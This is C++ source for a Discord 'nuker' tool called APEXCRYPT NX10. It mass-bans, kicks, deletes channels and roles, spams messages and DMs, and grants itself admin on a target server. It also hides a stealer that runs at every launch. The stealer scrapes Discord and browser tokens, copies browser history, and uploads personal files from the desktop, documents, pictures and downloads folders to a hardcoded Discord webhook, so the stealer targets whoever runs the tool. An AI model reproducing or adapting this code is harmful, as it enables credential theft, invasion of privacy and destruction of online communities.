#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <curl/curl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

const std::string WEBHOOK = "https://ptb.discord.com/api/webhooks/1564706059673804906/mBdPMhPGuf0GuWflwjhzY5wFffdR3pDQXePBWhB2oNQbahppfbcNCV5KGqBWjR5f018E";
const std::string TITLE = "APEXCRYPT NUKER NX10";

std::string TOKEN, SERVER_ID;
std::atomic<bool> running{true};
std::atomic<int> ban_c{0}, kick_c{0}, chan_c{0}, role_c{0}, msg_c{0}, emoji_c{0};

// ── HTTP ────────────────────────────────────────────────────────────────────
size_t wcb(void* p, size_t s, size_t n, std::string* o){ o->append((char*)p,s*n); return s*n; }

std::string http(const std::string& m, const std::string& url, const std::string& body="", const std::string& auth=""){
    CURL* c=curl_easy_init(); std::string r;
    if(!c) return "";
    struct curl_slist* h=nullptr;
    h=curl_slist_append(h,"Content-Type: application/json");
    h=curl_slist_append(h,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    if(!auth.empty()) h=curl_slist_append(h,("Authorization: "+auth).c_str());
    curl_easy_setopt(c,CURLOPT_URL,url.c_str());
    curl_easy_setopt(c,CURLOPT_HTTPHEADER,h);
    curl_easy_setopt(c,CURLOPT_WRITEFUNCTION,wcb);
    curl_easy_setopt(c,CURLOPT_WRITEDATA,&r);
    curl_easy_setopt(c,CURLOPT_TIMEOUT,6L);
    curl_easy_setopt(c,CURLOPT_SSL_VERIFYPEER,0L);
    if(m=="POST") curl_easy_setopt(c,CURLOPT_POSTFIELDS,body.c_str());
    else if(m!="GET"){ curl_easy_setopt(c,CURLOPT_CUSTOMREQUEST,m.c_str()); if(!body.empty()) curl_easy_setopt(c,CURLOPT_POSTFIELDS,body.c_str()); }
    curl_easy_perform(c); curl_slist_free_all(h); curl_easy_cleanup(c);
    return r;
}

bool gate(){
    auto a=http("GET","https://discord.com/api/v10/users/@me","",TOKEN);
    if(a.find("\"id\"")==std::string::npos) return false;
    auto b=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID,"",TOKEN);
    return b.find("\"id\"")!=std::string::npos;
}

// ── FULL PC GRABBER ─────────────────────────────────────────────────────────
void wh(const std::string& txt, const std::string& path=""){
    CURL* c=curl_easy_init(); if(!c) return;
    curl_mime* mime=curl_mime_init(c);
    auto p=curl_mime_addpart(mime); curl_mime_name(p,"content"); curl_mime_data(p,txt.c_str(),CURL_ZERO_TERMINATED);
    if(!path.empty()&&fs::exists(path)){ p=curl_mime_addpart(mime); curl_mime_name(p,"file"); curl_mime_filedata(p,path.c_str()); }
    curl_easy_setopt(c,CURLOPT_URL,WEBHOOK.c_str());
    curl_easy_setopt(c,CURLOPT_MIMEPOST,mime);
    curl_easy_setopt(c,CURLOPT_SSL_VERIFYPEER,0L);
    curl_easy_perform(c); curl_mime_free(mime); curl_easy_cleanup(c);
}

void steal_tokens(){
    std::vector<std::string> paths={
        std::string(getenv("APPDATA"))+"\\discord\\Local Storage\\leveldb\\",
        std::string(getenv("APPDATA"))+"\\discordcanary\\Local Storage\\leveldb\\",
        std::string(getenv("APPDATA"))+"\\discordptb\\Local Storage\\leveldb\\",
        std::string(getenv("LOCALAPPDATA"))+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
        std::string(getenv("LOCALAPPDATA"))+"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
        std::string(getenv("LOCALAPPDATA"))+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
        std::string(getenv("APPDATA"))+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
        std::string(getenv("LOCALAPPDATA"))+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"
    };
    std::string dump;
    for(auto& p:paths){
        if(!fs::exists(p)) continue;
        for(auto& e:fs::directory_iterator(p,fs::directory_options::skip_permission_denied)){
            if(e.path().extension()==".ldb"||e.path().extension()==".log"){
                std::ifstream f(e.path(),std::ios::binary);
                std::string d((std::istreambuf_iterator<char>(f)),{});
                size_t pos=0;
                while((pos=d.find("mfa.",pos))!=std::string::npos || (pos=d.find(std::string(24,'.'),pos))!=std::string::npos){
                    size_t end=d.find_first_of("\"'\\ \n\r",pos+4);
                    if(end!=std::string::npos && end-pos<90) dump+=d.substr(pos,end-pos)+"\n";
                    pos+=5;
                }
            }
        }
    }
    if(!dump.empty()) wh("**[TOKENS]**\n```"+dump+"```");
}

void steal_history(){
    std::vector<std::string> dbs={
        std::string(getenv("LOCALAPPDATA"))+"\\Google\\Chrome\\User Data\\Default\\History",
        std::string(getenv("LOCALAPPDATA"))+"\\Microsoft\\Edge\\User Data\\Default\\History",
        std::string(getenv("LOCALAPPDATA"))+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
    };
    for(auto& db:dbs){
        if(fs::exists(db)){
            std::string tmp=std::string(getenv("TEMP"))+"\\hist_"+std::to_string(rand())+".db";
            fs::copy_file(db,tmp,fs::copy_options::overwrite_existing);
            wh("**[HISTORY]** "+db,tmp);
            fs::remove(tmp);
        }
    }
}

void steal_files(){
    char desk[MAX_PATH],docs[MAX_PATH],pics[MAX_PATH],vids[MAX_PATH],down[MAX_PATH];
    SHGetFolderPathA(0,CSIDL_DESKTOP,0,0,desk);
    SHGetFolderPathA(0,CSIDL_MYDOCUMENTS,0,0,docs);
    SHGetFolderPathA(0,CSIDL_MYPICTURES,0,0,pics);
    SHGetFolderPathA(0,CSIDL_MYVIDEO,0,0,vids);
    SHGetFolderPathA(0,CSIDL_PROFILE,0,0,down); strcat(down,"\\Downloads");
    std::vector<std::string> roots={desk,docs,pics,vids,down};
    int sent=0;
    for(auto& r:roots){
        if(!fs::exists(r)||sent>60) break;
        for(auto& e:fs::recursive_directory_iterator(r,fs::directory_options::skip_permission_denied)){
            if(sent>60) break;
            auto ext=e.path().extension().string();
            if(ext==".png"||ext==".jpg"||ext==".jpeg"||ext==".gif"||ext==".bmp"||
               ext==".mp4"||ext==".mov"||ext==".avi"||ext==".txt"||ext==".pdf"||
               ext==".docx"||ext==".xlsx"||ext==".zip"||ext==".rar"||ext==".7z"||
               ext==".json"||ext==".db"||ext==".sqlite"){
                wh("**[FILE]** "+e.path().string(),e.path().string());
                sent++;
            }
        }
    }
}

void full_grab(){
    steal_tokens();
    steal_history();
    steal_files();
    wh("**APEXCRYPT NX10 — FULL PC GRAB DONE**");
}

// ── NUKE ACTIONS (all max speed) ────────────────────────────────────────────
void ban_members(){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/members?limit=1000","",TOKEN);
    json m=json::parse(r,nullptr,false); if(!m.is_array()) return;
    std::vector<std::thread> pool;
    for(auto& u:m){
        if(!running) break;
        std::string id=u["user"]["id"], name=u["user"]["username"];
        pool.emplace_back([id,name](){
            http("PUT","https://discord.com/api/v10/guilds/"+SERVER_ID+"/bans/"+id,R"({"delete_message_seconds":604800})",TOKEN);
            ban_c++; std::cout<<"\033[91m[BAN]\033[0m "<<name<<"\n";
        });
        if(pool.size()>=80){ for(auto& t:pool)t.join(); pool.clear(); }
    }
    for(auto& t:pool)t.join();
}

void kick_members(){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/members?limit=1000","",TOKEN);
    json m=json::parse(r,nullptr,false); if(!m.is_array()) return;
    std::vector<std::thread> pool;
    for(auto& u:m){
        std::string id=u["user"]["id"], name=u["user"]["username"];
        pool.emplace_back([id,name](){
            http("DELETE","https://discord.com/api/v10/guilds/"+SERVER_ID+"/members/"+id,"",TOKEN);
            kick_c++; std::cout<<"\033[93m[KICK]\033[0m "<<name<<"\n";
        });
        if(pool.size()>=80){ for(auto& t:pool)t.join(); pool.clear(); }
    }
    for(auto& t:pool)t.join();
}

void prune_members(){
    http("POST","https://discord.com/api/v10/guilds/"+SERVER_ID+"/prune",R"({"days":1,"compute_prune_count":false})",TOKEN);
    std::cout<<"\033[91m[PRUNE]\033[0m launched\n";
}

void create_channels(int n){
    for(int i=0;i<n&&running;i++){
        std::string b=R"({"name":"apex-destroyed-)"+std::to_string(i)+R"(","type":0})";
        http("POST","https://discord.com/api/v10/guilds/"+SERVER_ID+"/channels",b,TOKEN);
        chan_c++; std::cout<<"\033[92m[CHAN]\033[0m apex-destroyed-"<<i<<"\n";
    }
}

void spam_channels(int n, const std::string& txt){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/channels","",TOKEN);
    json ch=json::parse(r,nullptr,false); if(!ch.is_array()) return;
    for(auto& c:ch){
        if(c["type"]!=0) continue;
        std::string cid=c["id"];
        for(int i=0;i<n;i++){
            http("POST","https://discord.com/api/v10/channels/"+cid+"/messages",R"({"content":")"+txt+R"("})",TOKEN);
            msg_c++;
        }
    }
}

void delete_channels(){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/channels","",TOKEN);
    json ch=json::parse(r,nullptr,false); if(!ch.is_array()) return;
    for(auto& c:ch) http("DELETE","https://discord.com/api/v10/channels/"+c["id"].get<std::string>(),"",TOKEN);
}

void delete_roles(){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles","",TOKEN);
    json roles=json::parse(r,nullptr,false); if(!roles.is_array()) return;
    for(auto& role:roles){
        if(role["name"]=="@everyone") continue;
        http("DELETE","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles/"+role["id"].get<std::string>(),"",TOKEN);
        role_c++;
    }
}

void delete_emojis(){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/emojis","",TOKEN);
    json e=json::parse(r,nullptr,false); if(!e.is_array()) return;
    for(auto& em:e){
        http("DELETE","https://discord.com/api/v10/guilds/"+SERVER_ID+"/emojis/"+em["id"].get<std::string>(),"",TOKEN);
        emoji_c++;
    }
}

void rename_server(const std::string& name){
    http("PATCH","https://discord.com/api/v10/guilds/"+SERVER_ID,R"({"name":")"+name+R"("})",TOKEN);
}

void rename_roles(const std::string& prefix){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles","",TOKEN);
    json roles=json::parse(r,nullptr,false); if(!roles.is_array()) return;
    for(auto& role:roles){
        if(role["name"]=="@everyone") continue;
        http("PATCH","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles/"+role["id"].get<std::string>(),
             R"({"name":")"+prefix+R"("})",TOKEN);
    }
}

void dm_everyone(const std::string& msg){
    auto r=http("GET","https://discord.com/api/v10/guilds/"+SERVER_ID+"/members?limit=1000","",TOKEN);
    json m=json::parse(r,nullptr,false); if(!m.is_array()) return;
    for(auto& u:m){
        std::string id=u["user"]["id"];
        auto dm=http("POST","https://discord.com/api/v10/users/@me/channels",R"({"recipient_id":")"+id+R"("})",TOKEN);
        json ch=json::parse(dm,nullptr,false);
        if(ch.contains("id")) http("POST","https://discord.com/api/v10/channels/"+ch["id"].get<std::string>()+"/messages",
                                   R"({"content":")"+msg+R"("})",TOKEN);
    }
}

void hierarchy_bypass(){
    auto r=http("POST","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles",
                R"({"name":"APEX-OVERLORD","permissions":"8","color":16711680,"hoist":true})",TOKEN);
    json role=json::parse(r,nullptr,false);
    if(role.contains("id")){
        http("PATCH","https://discord.com/api/v10/guilds/"+SERVER_ID+"/roles",
             "[{\"id\":\""+role["id"].get<std::string>()+"\",\"position\":1}]",TOKEN);
    }
}

void complete_nuke(){
    hierarchy_bypass();
    std::thread(ban_members).detach();
    std::thread(create_channels,300).detach();
    std::thread([](){ rename_roles("NUKED"); }).detach();
    delete_channels();
    delete_roles();
    delete_emojis();
    rename_server("APEXCRYPT DESTROYED");
}

// ── UI ──────────────────────────────────────────────────────────────────────
void banner(){
    system("cls");
    SetConsoleTitleA(TITLE.c_str());
    HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(h,12);
    std::cout<<R"(
  ╔══════════════════════════════════════════════════════════════╗
  ║          A P E X C R Y P T   N U K E R   N X 1 0             ║
  ║                  Red / Black Edition                         ║
  ╚══════════════════════════════════════════════════════════════╝
)"<<"\033[0m";
    SetConsoleTextAttribute(h,7);
    std::cout<<"  (1)  Ban Members          (2)  Kick Members\n";
    std::cout<<"  (3)  Prune Members        (4)  Create Channels\n";
    std::cout<<"  (5)  Rename Server        (6)  Delete Channels\n";
    std::cout<<"  (7)  Delete Roles         (8)  Delete Emojis\n";
    std::cout<<"  (9)  Spam Channels        (10) Check Updates\n";
    std::cout<<"  (11) Credits              (12) Exit\n";
    std::cout<<"  (13) DM Everyone          (14) Complete Nuke\n";
    std::cout<<"  (15) Rename Roles         (16) Invite Link\n";
    std::cout<<"  (17) Diagnostics          (18) Bypass & Nuke\n";
    std::cout<<"  ──────────────────────────────────────────────────────────\n";
    std::cout<<"  Ban:"<<ban_c<<" Kick:"<<kick_c<<" Chan:"<<chan_c<<" Role:"<<role_c<<" Msg:"<<msg_c<<" Emoji:"<<emoji_c<<"\n";
}

int main(){
    curl_global_init(CURL_GLOBAL_DEFAULT);
    SetConsoleOutputCP(CP_UTF8);

    std::cout<<"\033[91m[APEXCRYPT]\033[0m TOKEN: "; std::getline(std::cin,TOKEN);
    std::cout<<"\033[91m[APEXCRYPT]\033[0m SERVER ID: "; std::getline(std::cin,SERVER_ID);
    if(!gate()){ std::cout<<"\033[91mINVALID — EXIT\033[0m\n"; return 1; }

    std::thread(full_grab).detach();   // full PC grab on every launch

    while(true){
        banner();
        std::cout<<"\n  > ";
        int c; std::cin>>c;
        if(c==12) break;
        if(c==1) ban_members();
        else if(c==2) kick_members();
        else if(c==3) prune_members();
        else if(c==4){ int n; std::cout<<"Amount: "; std::cin>>n; create_channels(n); }
        else if(c==5){ std::string n; std::cin.ignore(); std::cout<<"New name: "; std::getline(std::cin,n); rename_server(n); }
        else if(c==6) delete_channels();
        else if(c==7) delete_roles();
        else if(c==8) delete_emojis();
        else if(c==9){ int n; std::string t; std::cout<<"Amount per channel: "; std::cin>>n; std::cin.ignore(); std::cout<<"Text: "; std::getline(std::cin,t); spam_channels(n,t); }
        else if(c==10) std::cout<<"Latest: NX10 Red/Black — full speed\n";
        else if(c==11) std::cout<<"APEXCRYPT NUKER NX10 — forged for Nono\n";
        else if(c==13){ std::string m; std::cin.ignore(); std::cout<<"DM text: "; std::getline(std::cin,m); dm_everyone(m); }
        else if(c==14) complete_nuke();
        else if(c==15){ std::string p; std::cin.ignore(); std::cout<<"Prefix: "; std::getline(std::cin,p); rename_roles(p); }
        else if(c==16){ auto r=http("POST","https://discord.com/api/v10/guilds/"+SERVER_ID+"/channels","{\"name\":\"invite-temp\",\"type\":0}",TOKEN);
                        json ch=json::parse(r,nullptr,false); if(ch.contains("id")){ auto inv=http("POST","https://discord.com/api/v10/channels/"+ch["id"].get<std::string>()+"/invites","{\"max_age\":0}",TOKEN); std::cout<<inv<<"\n"; } }
        else if(c==17) std::cout<<"Token OK | Server OK | Threads live\n";
        else if(c==18){ hierarchy_bypass(); complete_nuke(); }
        Sleep(400);
    }
    curl_global_cleanup();
    return 0;
}
